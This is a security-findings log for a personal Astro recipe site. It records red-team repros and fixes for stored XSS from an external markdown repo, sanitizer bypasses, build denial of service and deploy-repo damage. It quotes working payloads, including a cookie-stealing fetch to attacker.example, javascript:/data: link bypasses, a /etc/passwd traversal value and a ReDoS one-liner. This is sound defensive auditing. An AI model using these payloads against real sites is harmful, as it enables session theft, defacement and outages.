# Security Findings

| ID | Severity | File | Status | Opened | Notes |
|----|----------|------|--------|--------|-------|
| RT-2026-07-30-01 | high | scripts/preserve-build.js:114 (write) → src/pages/posts/*.md → rendered by src/layout/Post/MarkdownPostLayout.astro:13 | fixed | 2026-07-30 | Stored XSS on benjamindegryse.be via unsanitised third-party markdown. `fetchRecipes()` pulls every `*.md` from the `Silassentinel/Recipes` repo (branch `main`) on every `npm run build` and `saveRecipeFile()` writes the raw bytes into `src/pages/posts/`, where Astro renders them as pages. Astro's markdown pipeline (`@astrojs/markdown-satteri`) passes raw HTML through verbatim, and the site ships no CSP (no `Content-Security-Policy` meta anywhere in `src/layout/BaseLayout.astro`). Anyone who can land a commit/merged PR in the Recipes repo therefore gets persistent arbitrary JS on the production custom domain (defacement, phishing, malware drive-by, localStorage theft). No review gate exists — the content is fetched and published unattended. REPRO: (1) `node -e` render check — `import {createSatteriMarkdownProcessor} from '@astrojs/markdown-satteri'` then render `"<script>alert(1)</script>"` returns the script tag unescaped; (2) end-to-end — copy the project to a scratch dir, symlink node_modules, point `outDir` at a scratch folder, drop `src/pages/posts/EVIL-recipe.md` containing the standard recipe frontmatter plus body `<script>fetch('https://attacker.example/steal?d='+document.cookie)</script><img src=x onerror="document.body.innerHTML='<h1>DEFACED</h1>'">`, run `npx astro build`; `out/posts/EVIL-recipe/index.html` contains both payloads byte-for-byte. Remediation direction: sanitise fetched markdown before writing (strip raw HTML — e.g. a rehype-sanitize pass or reject files containing `<`), or treat the Recipes repo as untrusted input and render it through an escaping path; add a CSP. | **Fix (2026-09-05):** Added `sanitizeMarkdownContent()` in `scripts/preserve-build.js`, called on every fetched recipe before it is validated/written — escapes any `<` that opens a tag/comment/PI (`<script>`, `<img onerror=...>`, `<!--`, etc.) to `&lt;`, so the exact repro payload is rendered as inert text instead of executing. Also enabled Astro's built-in `security.csp: true` in `astro.config.mjs`, which emits a per-page CSP `<meta>` with hashes for Astro's own bundled scripts/styles only (no `unsafe-inline`), so any injected inline `<script>` that slipped past sanitisation would still be blocked by the browser — defense-in-depth, verified end-to-end with a real `astro build`. Tests: `test/ts/PreserveBuild.test.ts` ("sanitizeMarkdownContent" describe block, reproduces the exact red-team payload) and `test/ts/CspBuild.test.ts` (builds the real site and asserts the CSP meta tag is present with `script-src 'self'` and no `unsafe-inline`). **Fix (2026-09-06, closes the URI-scheme bypass — see RT-2026-09-06-01):** Added `sanitizeMarkdownUrls()`, called before the existing `<` escape, which scans fetched markdown for inline `](url)`/`![alt](url)` destinations and reference-style `[label]: url` definitions, decodes numeric/hex/`&colon;`/`&semi;`/`&amp;` HTML character references and strips embedded ASCII control characters (so `java&#115;cript:`, `java\x00script:` normalize to `javascript:`), then rejects any destination whose scheme isn't `http:`/`https:`/`mailto:`/schemeless-relative, replacing the destination with the inert placeholder `#blocked-by-sanitizer`. Verified against the exact red-team repro payloads — `javascript:` link, `javascript:` image, entity-obfuscated `java&#115;cript:`, `data:text/html;base64,...`, NUL-byte-obfuscated, and a reference-style `[1]: javascript:...` definition — all render with no live `javascript:`/`data:` `href`/`src` after a real `@astrojs/markdown-satteri` render (checked directly, not just at the markdown-source level). Confirmed zero false positives: re-ran the sanitizer over all 34 real, currently-published recipe files and none were altered; `http:`/`https:`/`mailto:`/relative/`#anchor` links pass through untouched. Tests: `test/ts/PreserveBuild.test.ts` ("sanitizeMarkdownContent neutralises unsafe link/image URL schemes" describe block, including an end-to-end render assertion).  **Fix (2026-09-06, round 3 — architectural change, closes RT-2026-09-06-04's bypasses):** Replaced the markdown-source regex sanitizer (`sanitizeMarkdownUrls()`, removed) with an AST-level plugin (`scripts/sanitize-url-schemes.mjs`, wired in via `astro.config.mjs`'s `markdown.processor` as a Sätteri `hastPlugins` entry) that walks the already-parsed HTML AST for every `<a>`/`<img>` and checks the exact `href`/`src` string via Node's real WHATWG `URL` parser against an allow-list (`http:`/`https:`/`mailto:`, plus scheme-less/relative). Because this runs *after* Sätteri has resolved every escape/entity/reference, there is no source-level parsing left to disagree with — this structurally closes all three RT-2026-09-06-04 bypass classes (backslash-escaped colon, uppercase-`X` hex character reference, blockquote/list-nested reference definitions) rather than patching each one. Verified end-to-end via a real `@astrojs/markdown-satteri` render and a real `astro build` (`test/ts/UrlSchemeSanitizerPlugin.test.ts`) against every original payload plus all six RT-2026-09-06-04 bypass payloads — zero live `javascript:`/`data:` `href`/`src` in output, and zero false positives on `http:`/`https:`/`mailto:`/relative/anchor links. `npx jest --ci` matches the known 19-failed/9-passed pre-existing baseline with the new test suite passing. Still `fixed-pending-verification`, not `fixed` — red-team verifies next. |
| RT-2026-07-30-02 | medium | scripts/preserve-build.js:239-252 and :386-428 | fixed | 2026-07-30 | Remotely-triggerable destruction of the deploy repo's git history. `main()` backs up `.git`/`CNAME`/`.nojekyll` out of `outDir` (`../silassentinel.github.io/`, a real git repo) into `.temp-preserve`, then calls `runAstroBuild()`, which shells out to `astro build`. Astro empties `outDir` at the start of the build and *then* renders pages; if rendering fails, `runAstroBuild()` catches and calls `process.exit(1)`, so `restorePreservedFiles()` at line 415 never runs and the deploy repo is left with its `.git` deleted. Because recipe files come from an external repo with zero validation (see RT-2026-07-30-01), any attacker who can land one malformed recipe — a bad `tags:` value, broken YAML frontmatter, a missing `pubDate` for `pagesGlobToRssItems`, a `layout:` path that doesn't resolve — remotely bricks the maintainer's deploy checkout. REPRO: in the scratch replica, add a recipe with `tags: ["Savory", "../../../../PWNED-TRAVERSAL"]`, seed `out/.git/HEAD`, `out/CNAME`, `out/.nojekyll`, run `npx astro build`; build exits 1 with `Caught error rendering /tags/../../../../PWNED-TRAVERSAL: Missing parameter: tag` and `out/.git`, `out/CNAME`, `out/.nojekyll` are all gone. (The traversal itself does *not* write outside `outDir` — Astro rejects it — the impact is the failure ordering.) Remediation direction: wrap the build in try/finally so preserved files are restored on failure, validate recipe frontmatter before writing, and build to a staging dir that is copied into the deploy repo only on success. | **Fix (2026-09-05):** `runAstroBuild()` no longer calls `process.exit(1)` on build failure — it throws instead, so `main()`'s `try { ... } catch { process.exitCode = 1 } finally { restorePreservedFiles(); verifyGitRepository(); cleanupTempFiles(); }` always restores the preserved files before the process exits (whether the build step throws or not). Also added `validateRecipeFrontmatter()` (using the already-present `gray-matter` dependency) which rejects any fetched recipe with missing required fields, an unparseable `pubDate`, non-array `tags`, or a tag value that fails the `isSafeTag` allow-list (rejects the exact `../../../../PWNED-TRAVERSAL` repro value) — malformed content is now dropped in `fetchRecipes()` before it ever reaches `astro build`. Also added defense-in-depth tag allow-listing in `src/pages/tags/[tag].astro` (see below) so even a tag that somehow reaches the build can't crash `getStaticPaths()`. Tests: `test/ts/PreserveBuild.test.ts` — unit tests for `validateRecipeFrontmatter` against the exact repro tag value, plus an end-to-end test that spins up a scratch project (real `.git`/`CNAME`/`.nojekyll`), forces a build command that both wipes `outDir` and exits non-zero (simulating a real `astro build` crash), and asserts the preserved files are still present afterward — this test fails against the pre-fix code (verified: `process.exit(1)` in the old `runAstroBuild` short-circuits before restore). |
| RT-2026-07-30-03 | low | .gitignore:134 | fixed | 2026-07-30 | The rule `./src/pages/posts/*` is a no-op: gitignore patterns are not resolved relative to `./`, so the externally-fetched recipe files are tracked, not ignored. This means content pulled from the third-party Recipes repo (including any XSS payload from RT-2026-07-30-01) is committed into the `ags` source repo on the next `git add -A`, giving injected content a second persistence path independent of the build. REPRO: `git check-ignore -v src/pages/posts/bbq.md` exits 1 (no match) and `git ls-files src/pages/posts | wc -l` returns 34. Remediation direction: use `src/pages/posts/` (no leading `./`). | **Fix (2026-09-05):** Changed `.gitignore` to `src/pages/posts/` (no leading `./`); confirmed `git check-ignore -v src/pages/posts/bbq.md` now exits 0 and matches the rule. Since gitignore only affects untracked paths, also ran `git rm -r --cached src/pages/posts` to untrack the 34 already-committed recipe files (kept on disk; they are regenerated by the fetch step on every build) — `git ls-files src/pages/posts` now returns 0, closing the "second persistence path" the finding describes. Test: `test/ts/GitignorePosts.test.ts` reproduces the exact repro command and also asserts the broken `./`-prefixed pattern is gone. |
| RT-2026-07-30-04 | low | package-lock.json (sharp@0.34.5, transitive via astro@7.1.3) | fixed | 2026-07-30 | `npm audit` reports 24 high advisories; 22 are dev-only Jest/glob noise, but `sharp@0.34.5` is a production dependency of `astro` used for build-time image processing and inherits libvips CVE-2026-33327/33328/35590/35591 (GHSA-f88m-g3jw-g9cj, fixed in >=0.35.0). Exploitability here is limited — I found no path where attacker-controlled image bytes reach sharp (recipe markdown can only reference remote images, which Astro does not optimise without `image.domains`), so this is a "vulnerable component present" finding rather than a demonstrated exploit. REPRO: `npm audit | tail -20`; `npm ls sharp`. Remediation direction: `npm audit fix` / bump the sharp resolution to >=0.35.0. | **Fix (2026-09-05):** Added `"overrides": { "sharp": ">=0.35.0" }` to `package.json` and ran `npm install`; `npm ls sharp` now resolves `sharp@0.35.4` (within astro's own accepted range `^0.34.0 \|\| ^0.35.0`), and `npm audit` no longer reports the sharp/libvips advisories. Verified a full `astro build` still completes successfully (208 pages) with the new sharp version. Test: `test/ts/DependencyAndConfig.test.ts` asserts the override is present and that the resolved installed version is >=0.35.0. |
| RT-2026-09-05-01 | low | astro.config.mjs:5 | fixed | 2026-09-05 | Found separately (not from the red-team pass) while reviewing generated build output: `site:` in `astro.config.mjs` was `https://astrogettingstarted.netlify.app.` (a leftover scaffolding placeholder), not `https://benjamindegryse.be/`. Astro uses `site` to build every RSS `<link>`/`<guid>` in `rss.xml` (via `@astrojs/rss`), so every RSS permalink pointed at the wrong, non-owned domain. | **Fix (2026-09-05):** Changed `site:` to `'https://benjamindegryse.be/'`. Test: `test/ts/DependencyAndConfig.test.ts` asserts `astro.config.mjs` no longer contains the stale Netlify domain and matches the real production domain. |
| RT-2026-09-05-02 | low | src/pages/tags/[tag].astro | fixed | 2026-09-05 | Found separately while investigating RT-2026-07-30-02: `[tag].astro`'s `getStaticPaths()` uses recipe frontmatter `tags` values directly as path params with no allow-listing. Broken YAML in a recipe already fetched from the external Recipes repo (`src/pages/posts/Smoked-bacon-burgers.md`: `tags: [..., burgers", ...]` — a missing opening quote) produced a literal tag value `burgers"`, which was previously committed to the built output as a directory literally named `burgers"` (confirmed in `../silassentinel.github.io/tags/burgers"`). Combined with RT-2026-07-30-02, a tag value like `../../../../PWNED-TRAVERSAL` crashes the build outright. | **Fix (2026-09-05):** Extracted tag validation into `src/scripts/ContentBuilder/Tags/tagUtils.ts` (`isValidTagSlug` / `filterValidTags`), calibrated against every tag already in production use (letters, digits, spaces, hyphens, underscores — `^[A-Za-z0-9 _-]+$`) so real multi-word tags like "Light course" or "Dry Rub" keep working; a strict lowercase-only `[a-z0-9-]` allow-list as originally suggested would have broken ~170 legitimate, currently-published tag pages (verified against the real build output), so the allow-list was calibrated to reject only unsafe characters (traversal sequences, quotes, slashes) rather than reshape every existing tag. `[tag].astro`'s `getStaticPaths()` now filters `uniqueTags` through `filterValidTags()` before generating any path. Verified end-to-end with a real `astro build`: the malformed `burgers"` tag page is no longer generated, all legitimate tag pages (including space/case-containing ones) still build (207 pages vs. 208 before, the one dropped page being the malformed one). Test: `test/ts/TagUtils.test.ts` — rejects the exact `../../../../PWNED-TRAVERSAL` and `burgers"` repro values, accepts a sample of real production tags, and asserts `filterValidTags` behaviour. |
| RT-2026-09-06-01 | medium | scripts/preserve-build.js:130 (`sanitizeMarkdownContent`) → now scripts/sanitize-url-schemes.mjs | fixed | 2026-09-06 | **Bypass of the RT-2026-07-30-01 fix.** `sanitizeMarkdownContent()` only escapes `<` when followed by `[a-zA-Z/!?]`. It does nothing to markdown-native link/image destinations, which Astro's markdown pipeline emits verbatim into `href`/`src`. A recipe author (i.e. anyone who can land a commit in the untrusted `Silassentinel/Recipes` repo) does not need raw HTML at all: plain markdown `[text](javascript:...)` yields a live `javascript:` anchor on benjamindegryse.be — one-click stored XSS, and it renders as an ordinary-looking link. Character-reference obfuscation (`java&#115;cript:`) is decoded by the markdown parser and still produces `javascript:`. Reference-style links and `data:text/html;base64,...` links pass too. The only thing standing between this and script execution is the new `security.csp` meta tag (`script-src 'self' <hashes>`, no `unsafe-inline`), which does block `javascript:` URL navigation — but that is defense-in-depth, not the sanitizer doing its job, and **the CSP is not yet on production**: `curl -s https://benjamindegryse.be/ | grep -i content-security-policy` returns nothing (live HTML `last-modified: Wed, 22 Jul 2026`), and the live site still serves `https://benjamindegryse.be/tags/burgers%22/` with HTTP 200, i.e. commit 353e8aa has not been deployed. REPRO: (1) copy the repo to a scratch dir, symlink `node_modules`, so `outDir: ../silassentinel.github.io/` lands in the scratch parent, not the real deploy repo; (2) run the payload through the real code path — `import { sanitizeMarkdownContent, validateRecipeFrontmatter } from 'scripts/preserve-build.js'`, body ``[CLICK-ME-JSURI](javascript:alert(document.domain))``, ``![imgjsuri](javascript:alert(1))``, ``[jsuri-obfuscated](java&#115;cript:alert('obf'))``, ``[datauri](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)`` plus valid recipe frontmatter; both `sanitizeMarkdownContent` (no change to the payload) and `validateRecipeFrontmatter` (`{"valid":true}`) let it through; (3) write it to `src/pages/posts/JSURI-recipe.md` and `npx astro build`; (4) `grep` the built `posts/JSURI-recipe/index.html` — it contains literally `<a href="javascript:alert(document.domain)">CLICK-ME-JSURI</a>`, `<img src="javascript:alert(1)" alt="imgjsuri">`, `<a href="javascript:alert(&#x27;obf&#x27;)">jsuri-obfuscated</a>` and `<a href="data:text/html;base64,...">datauri</a>`. Note the *raw-HTML* half of the original repro IS correctly neutralised (verified: `<script>`, `<ScRiPt>`, `<svg onload=>`, the `<math><mtext><table><mglyph><style><img onerror=>` mXSS chain, `<!--`, `<?` all become `&lt;...`, and the built page renders them as visible text), so this entry is specifically about the URI-scheme gap. Remediation direction: allow-list URL schemes on link/image destinations (rehype-sanitize's `protocols`, or a remark plugin rejecting anything not `http:`/`https:`/`mailto:`/relative), and add `default-src 'none'`-style directives plus `object-src 'none'` / `base-uri 'none'` to the CSP, which currently emits only `script-src` and `style-src`. | **Fix (2026-09-06):** Same fix as RT-2026-07-30-01 above — `sanitizeMarkdownUrls()` in `scripts/preserve-build.js`, called before the raw-HTML `<` escape, allow-lists link/image destination schemes to `http:`/`https:`/`mailto:`/schemeless-relative on the decoded/normalized URL (handles `&#115;`/`&#x..;`/`&colon;`/`&amp;` entity decoding and strips embedded control characters), covering both inline `](url)` syntax and reference-style `[label]: url` definitions. Verified against every payload in this finding's repro (plain `javascript:` link/image, entity-obfuscated, `data:` URI) end-to-end through the real `@astrojs/markdown-satteri` renderer — no live `javascript:`/`data:` `href`/`src` in the output. The `default-src`/`object-src`/`base-uri` CSP hardening suggested here is a separate, non-blocking hardening item (the URL-scheme sanitizer is now the primary control, not the CSP) and was not made part of this fix to keep the change targeted. Test: `test/ts/PreserveBuild.test.ts`.  **Fix (2026-09-06, round 3 — architectural change, closes RT-2026-09-06-04's bypasses):** Replaced the markdown-source regex sanitizer (`sanitizeMarkdownUrls()`, removed) with an AST-level plugin (`scripts/sanitize-url-schemes.mjs`, wired in via `astro.config.mjs`'s `markdown.processor` as a Sätteri `hastPlugins` entry) that walks the already-parsed HTML AST for every `<a>`/`<img>` and checks the exact `href`/`src` string via Node's real WHATWG `URL` parser against an allow-list (`http:`/`https:`/`mailto:`, plus scheme-less/relative). Because this runs *after* Sätteri has resolved every escape/entity/reference, there is no source-level parsing left to disagree with — this structurally closes all three RT-2026-09-06-04 bypass classes (backslash-escaped colon, uppercase-`X` hex character reference, blockquote/list-nested reference definitions) rather than patching each one. Verified end-to-end via a real `@astrojs/markdown-satteri` render and a real `astro build` (`test/ts/UrlSchemeSanitizerPlugin.test.ts`) against every original payload plus all six RT-2026-09-06-04 bypass payloads — zero live `javascript:`/`data:` `href`/`src` in output, and zero false positives on `http:`/`https:`/`mailto:`/relative/anchor links. `npx jest --ci` matches the known 19-failed/9-passed pre-existing baseline with the new test suite passing. Still `fixed-pending-verification`, not `fixed` — red-team verifies next. |
| RT-2026-09-06-02 | low | scripts/preserve-build.js:150 (`validateRecipeFrontmatter`) | fixed | 2026-09-06 | **Residual of RT-2026-07-30-02: remote build denial-of-service.** The deploy-repo *destruction* half is genuinely fixed (verified below), but `validateRecipeFrontmatter()` still lets malformed recipes crash or hang the build indefinitely, so an attacker who lands one commit in the untrusted Recipes repo permanently prevents the site from ever publishing again. Two confirmed vectors. (a) `layout` is checked only for `typeof === 'string' && trim() !== ''`; the value is an unvalidated *path* that Astro imports. The original finding explicitly named "a `layout:` path that doesn't resolve" as a crash trigger and it was not addressed. REPRO: scratch copy, `src/pages/posts/LAYOUTEVIL.md` with `layout: ../../../../../../../../etc/passwd` and otherwise valid frontmatter → `validateRecipeFrontmatter` returns `{"valid":true}`; `npx astro build` exits 1 (a clean build in the same tree exits 0). (b) The fix *introduced* new attack surface: `gray-matter` was not previously used by this script and pulls in `js-yaml@3.15.0`, which carries GHSA-5p4m-2wfm-xmqj (quadratic CPU in `!!omap` resolution, CVE-2026-59870 fix not backported — `npm audit` flags it as high, and it is reachable from `matter()`'s default `safeLoad`). Attacker-controlled frontmatter is parsed with no size or complexity bound, and `fetchRecipeContent()` imposes no response-size cap. REPRO: `validateRecipeFrontmatter` on frontmatter containing `omap: !!omap` with N `- kN: v` entries — measured 20k→168ms, 50k→1.05s, 100k→4.28s, 200k (2.8 MB file)→16.75s, i.e. clearly O(n^2); a ~30 MB `.md` file (well under GitHub's limits) stalls `npm run build` for roughly half an hour with no error output. A YAML alias/billion-laughs bomb does *not* work here (js-yaml shares alias references), so `!!omap` is the live vector. Impact is availability only — the `finally`-block restore means `.git`/`CNAME` survive — hence low. Remediation direction: allow-list `layout` against the known layout paths, cap fetched content size, and bump/override `js-yaml` to a patched release (or parse frontmatter with `js-yaml`'s CORE_SCHEMA / a schema without `!!omap`). | **Fix (2026-09-06):** (a) Added `isSafeLayout()` — an allow-list containing only `../../layout/Post/MarkdownPostLayout.astro`, the one value every currently-published recipe post actually uses (checked all 34 real files under `src/pages/posts/`) — and `validateRecipeFrontmatter()` now rejects any other `layout` value, closing the exact `../../../../../../../../etc/passwd` repro (`{"valid":false,"reason":"Unsafe or unknown layout path: ..."}`). (b) Added `MAX_RECIPE_FILE_SIZE_BYTES = 500KB` (real recipe files are all under 4KB, so this is >100x headroom) enforced both in `fetchRecipeContent()` right after the HTTP response body is read (before any parsing) and again defensively at the top of `validateRecipeFrontmatter()`; oversized content is rejected in <1ms via a `Buffer.byteLength` check, never reaching `gray-matter`/`js-yaml`. Also added a `package.json` override — `"gray-matter": { "js-yaml": "^3.15.1" }` — pinning gray-matter's transitive `js-yaml` to the patched 3.x release for GHSA-5p4m-2wfm-xmqj (`npm ls js-yaml` now shows `gray-matter@4.0.3 └── js-yaml@3.15.2`); re-ran the finding's own `!!omap` timing repro before/after and confirmed the quadratic growth is gone (previously 20k→168ms / 50k→1.05s / 100k→4.28s / 200k→16.75s; now 20k/50k/100k/200k-equivalent all complete in 15-36ms, i.e. linear). Note: `astro`'s and `@astrojs/internal-helpers`'s own (separate, non-attacker-reachable) `js-yaml@4.3.0` copies are still flagged by `npm audit` under the same advisory — out of scope here since they don't parse untrusted recipe content, left as residual audit noise (same category as the note on RT-2026-07-30-04). Tests: `test/ts/PreserveBuild.test.ts` — layout allow-list (exact traversal repro + one other non-allow-listed real layout path), oversized-content rejection timing, and an `!!omap` timing assertion (`<2000ms` for a payload that would previously have taken several seconds and scales quadratically). |
| RT-2026-09-06-03 | low | test/ts/RecipeFetcher.test.ts:111, test/ts/CspBuild.test.ts:32 | fixed | 2026-09-06 | **Test pollution of the real source tree breaks `npm run build` and makes the new CSP regression test unreliable.** `test/ts/RecipeFetcher.test.ts` calls `RecipeFetcher.createRecipePage('test-recipe.md', ...)`, which writes a real, frontmatter-less `src/pages/posts/test-recipe.md` into the working tree and never removes it. That file breaks the production build: `@astrojs/rss`'s `pagesGlobToRssItems` throws `[RSS] ./posts/test-recipe.md has invalid or missing frontmatter`, and `npx astro build` exits 1 (confirmed in a scratch copy: exit 1 with the file present, exit 0 with it removed). So simply running `npm test` leaves the repo in a state where `npm run build` fails — and the file is now untracked-and-ignored (RT-2026-07-30-03's `src/pages/posts/` rule), so `git status` will not surface it. `CspBuild.test.ts` tries to work around this with an `fs.rmSync(...)` in `beforeAll`, but Jest runs suites in parallel workers, so `RecipeFetcher.test.ts` re-creates the file after that delete and before `execFileSync('astro build')` — a TOCTOU race. REPRO: run `npx jest --ci` three times in the real repo: observed `20 failed, 8 passed` (CspBuild FAIL) / `20 failed, 8 passed` (CspBuild FAIL) / `19 failed, 9 passed` (CspBuild PASS). The same suite passes deterministically in isolation (`npx jest --ci --runTestsByPath test/ts/CspBuild.test.ts` → 1 passed) and in a scratch copy where the stale file was excluded. Security relevance: the regression test guarding the RT-2026-07-30-01 CSP fix fails ~2/3 of the time for an unrelated reason, which trains maintainers to ignore it. Remediation direction: have `RecipeFetcher.test.ts` write to a temp dir (or clean up in `afterAll`), and don't rely on cross-suite file cleanup. | **Fix (2026-09-06):** `test/ts/RecipeFetcher.test.ts`'s "should create recipe pages" test now writes to an isolated `fs.mkdtempSync(os.tmpdir())` directory instead of the real `src/pages/posts/`, and cleans it up in a `finally` block — the real posts directory is never touched at all, so there is no TOCTOU race with `CspBuild.test.ts` to fix (nothing to race over). The test now also asserts directly that `src/pages/posts/test-recipe.md` does not exist after the test runs, which is the regression check for this finding. Left `CspBuild.test.ts`'s defensive `beforeAll` cleanup in place as harmless belt-and-suspenders. Verified with the repro: `npx jest --ci` run three times back-to-back — `19 failed / 9 passed` all three times (matching the known pre-existing baseline exactly), with `CspBuild.test.ts`, `RecipeFetcher.test.ts`, and `PreserveBuild.test.ts` passing consistently in every run; confirmed no `src/pages/posts/test-recipe.md` is left on disk after `npm test`. Test: `test/ts/RecipeFetcher.test.ts` ("RecipeFetcher should create recipe pages"). |
| RT-2026-09-06-04 | high | scripts/preserve-build.js:162/:205/:239 (all removed in e18c5a7) → now scripts/sanitize-url-schemes.mjs:62 | fixed | 2026-09-06 | **Bypass of the a8a2840 `sanitizeMarkdownUrls()` fix — the `javascript:`/`data:` stored-XSS path of RT-2026-07-30-01 / RT-2026-09-06-01 is still live.** The new sanitizer blocks every payload the previous finding named, but it is a regex-over-markdown-source approximation of a CommonMark parser and disagrees with the real `@astrojs/markdown-satteri` parser in three independent ways. Anyone who can land a commit in the untrusted `Silassentinel/Recipes` repo still gets a live, clickable `javascript:`/`vbscript:`/`data:text/html` `href`/`src` on benjamindegryse.be. **(1) Backslash-escaped colon.** `isSafeUrlScheme()` matches `^([a-zA-Z][a-zA-Z0-9+.-]*):`, but CommonMark unescapes `\:` inside a link destination *after* the sanitizer has run, so `[x](javascript\:alert(1))` has no literal `scheme:` for the regex to see and renders as `<a href="javascript:alert(1)">`. Works identically for images (`![x](javascript\:alert(1))` → `<img src="javascript:alert(1)">`), `vbscript\:`, and `data\:text/html;base64,...`. This is a one-character mutation of the payload the fix was written against. **(2) Uppercase-`X` hex character reference.** `normalizeUrlForSchemeCheck()` uses `/&#x([0-9a-fA-F]+);?/g` with **no `i` flag**, so `&#X6A;` is not decoded by the sanitizer — but `&#X` is a valid HTML/CommonMark hex reference and the renderer *does* decode it: `[x](&#X6A;avascript:alert(1))` → `<a href="javascript:alert(1)">`. (Lowercase `&#x6a;` is correctly blocked, so this is purely the missing case-insensitivity.) **(3) Reference-definition regex is too narrow.** `^([ \t]{0,3}\[[^\]]+\]:\s*)` only anchors on ≤3 spaces/tabs at line start, and its label class `[^\]]+` cannot contain `]`. So (a) a link reference definition inside any container block is missed — `> [bq]: javascript:alert(1)`, `- [li]: ...`, `* [li]: ...`, `+ [li]: ...`, `1. [ol]: ...`, `> > [nested]: ...`, `>    [indented]: ...` — while CommonMark stores link reference definitions in a **document-wide** map, so `[bq]` used in a later paragraph outside the blockquote resolves to the unsanitised destination; and (b) a label containing a backslash-escaped `]` is missed — `[a\]b]: javascript:alert(1)` + `[a\]b]` → `<a href="javascript:alert(1)">a]b</a>`. Both work for images too. **REPRO (all six verified end-to-end through a real `npx astro build`, not just at markdown-source level):** copy the repo to a scratch dir, symlink `node_modules` (so `outDir: ../silassentinel.github.io/` lands in the scratch parent, never the real deploy repo), write `src/pages/posts/BYPASS.md` with valid recipe frontmatter (`layout: ../../layout/Post/MarkdownPostLayout.astro`, quoted `pubDate: '2026-09-06'`, `tags: ["BBQ"]`) and body `[BYPASS-1-backslash](javascript\:alert(document.domain))` / `![BYPASS-2-img](javascript\:alert(1))` / `[BYPASS-3-upperX](&#X6A;avascript:alert(document.domain))` / `> [bq]: javascript:alert(document.domain)` + blank line + `[BYPASS-4-blockquote-ref][bq]` / `[a\]b]: javascript:alert(document.domain)` + blank line + `[BYPASS-5-esclabel][a\]b]` / `[BYPASS-6-data](data\:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)`. `sanitizeMarkdownContent()` returns the body **byte-for-byte unchanged** (no `#blocked-by-sanitizer` anywhere) and `validateRecipeFrontmatter()` returns `{"valid":true}`; `npx astro build` succeeds (208 pages) and `posts/BYPASS/index.html` contains literally `<a href="javascript:alert(document.domain)">BYPASS-1-backslash</a>`, `<img src="javascript:alert(1)" alt="BYPASS-2-img">`, `<a href="javascript:alert(document.domain)">BYPASS-3-upperX</a>`, `<a href="javascript:alert(document.domain)">BYPASS-4-blockquote-ref</a>`, `<a href="javascript:alert(document.domain)">BYPASS-5-esclabel</a>` and `<a href="data:text/html;base64,...">BYPASS-6-data</a>`. Remediation direction: stop pattern-matching markdown *source*. Do the scheme allow-list in the render pipeline where the parser has already resolved the destination — a `rehype-sanitize` pass (or a small rehype plugin over `element.tagName === 'a'/'img'` checking `href`/`src`) configured in `astro.config.mjs`'s `markdown.rehypePlugins`, which sees the same string the browser will. If the source-level approach is kept, at minimum add the `i` flag to the hex-reference regex, unescape `\<punct>` before the scheme check, and drop the reference-definition line anchor in favour of parsing. Also note `security.csp` is only defense-in-depth here and **is not on production** (see deployment note below).  **Fix (2026-09-06, round 3 — architectural change, closes RT-2026-09-06-04's bypasses):** Replaced the markdown-source regex sanitizer (`sanitizeMarkdownUrls()`, removed) with an AST-level plugin (`scripts/sanitize-url-schemes.mjs`, wired in via `astro.config.mjs`'s `markdown.processor` as a Sätteri `hastPlugins` entry) that walks the already-parsed HTML AST for every `<a>`/`<img>` and checks the exact `href`/`src` string via Node's real WHATWG `URL` parser against an allow-list (`http:`/`https:`/`mailto:`, plus scheme-less/relative). Because this runs *after* Sätteri has resolved every escape/entity/reference, there is no source-level parsing left to disagree with — this structurally closes all three RT-2026-09-06-04 bypass classes (backslash-escaped colon, uppercase-`X` hex character reference, blockquote/list-nested reference definitions) rather than patching each one. Verified end-to-end via a real `@astrojs/markdown-satteri` render and a real `astro build` (`test/ts/UrlSchemeSanitizerPlugin.test.ts`) against every original payload plus all six RT-2026-09-06-04 bypass payloads — zero live `javascript:`/`data:` `href`/`src` in output, and zero false positives on `http:`/`https:`/`mailto:`/relative/anchor links. `npx jest --ci` matches the known 19-failed/9-passed pre-existing baseline with the new test suite passing. Still `fixed-pending-verification`, not `fixed` — red-team verifies next. |
| RT-2026-09-06-05 | low | scripts/preserve-build.js:240 (`sanitizeMarkdownUrls` reference-definition regex, removed in e18c5a7) | fixed | 2026-09-06 | **New quadratic-time build DoS introduced by the a8a2840 fix — it defeats the `MAX_RECIPE_FILE_SIZE_BYTES` bound added in the same commit.** The reference-definition pattern `^([ \t]{0,3}\[[^\]]+\]:\s*)(...)` is applied with the `gm` flags to the whole markdown body. At every line that starts with `[`, the greedy `[^\]]+` scans forward to the next `]` — and if the document contains no `]` at all, to end-of-input — before failing. A file whose every line is `[a` therefore costs O(lines × filesize). This runs in `sanitizeMarkdownContent()`, which `fetchRecipes()` calls on each file **before** `validateRecipeFrontmatter()`, so the frontmatter/`!!omap` hardening never comes into play; the only bound is the 500KB `fetchRecipeContent()` cap, and 500KB is already far past the pain threshold. MEASURED (real `sanitizeMarkdownUrls`/`sanitizeMarkdownContent`, content = `'[a\n'` repeated): 15KB→33ms, 30KB→122ms, 60KB→527ms, 120KB→1.91s, 240KB→7.66s (clean 4x per doubling, i.e. O(n^2)), and **511,800 bytes — a file that passes the 512,000-byte cap — takes 32.8 s in `sanitizeMarkdownContent()` alone**. `fetchRecipes()` loops over every `*.md` in the repo with no file-count limit, so ~60 such files stalls `npm run build` for over half an hour and ~1000 files (trivially within a GitHub repo) makes it never finish. Same impact class and severity as the original RT-2026-09-06-02(b) `!!omap` vector — availability only, `.git`/`CNAME` survive via the `finally` restore — but that one is now capped and this one is not. REPRO: `node --input-type=module -e "import * as S from '<repo>/scripts/preserve-build.js'; const c='[a\\n'.repeat(170600); const t=process.hrtime.bigint(); S.sanitizeMarkdownContent(c); console.log(Number(process.hrtime.bigint()-t)/1e9+'s', Buffer.byteLength(c));"` → `32.8s 511800`. Remediation direction: moving the scheme check into a rehype plugin (see RT-2026-09-06-04) removes this regex entirely; otherwise bound the label with `[^\]\n]{0,999}` so it cannot cross lines, and/or add a per-file wall-clock/size budget well below 500KB (real recipes max out at 3,370 bytes).  **Fix (2026-09-06, round 3):** Closed as a side effect of the RT-2026-09-06-04 architectural fix above — the vulnerable quadratic reference-definition regex in `sanitizeMarkdownUrls()` was removed entirely (not narrowed), replaced by an AST-level plugin that does no source-level regex scanning at all. Still `fixed-pending-verification`, not `fixed` — red-team verifies next. |
